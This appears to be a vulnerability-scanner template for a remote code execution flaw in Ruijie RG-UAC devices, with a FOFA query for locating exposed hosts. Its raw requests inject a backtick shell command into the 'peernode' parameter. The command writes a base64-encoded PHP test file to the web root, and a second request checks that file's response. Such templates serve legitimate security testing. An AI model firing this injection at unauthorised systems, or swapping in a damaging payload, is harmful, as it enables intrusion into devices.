http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, "c8c605999f3d8352d7bb792cf3fdb25")
    type: dsl
  raw:
  - 'GET /view/vpn/autovpn/online_check.php?peernode=|`echo%20PD9waHAgZWNobyBtZDUoJzk5OTk5OTk5OScpO3VubGluayhfX0ZJTEVfXyk7Pz4=|base64%20-d%20>%20{{filename}}.php`
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /view/vpn/autovpn/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: ruijie-uac-remote-rce
info:
  author: Co5mos
  description: Ruijie-UAC is vulnerable to remote code execution, allowing attackers
    to execute arbitrary commands.
  metadata:
    fofa-query: app="Ruijie-RG-UAC"
  name: Ruijie-UAC Remote Code Execution Vulnerability
  reference:
  - https://mp.weixin.qq.com/s/n6mCYi2L3cZGH8SaN7yblg
  severity: critical
  tags: ruijie,rce
variables:
  filename: '{{rand_base(5)}}'
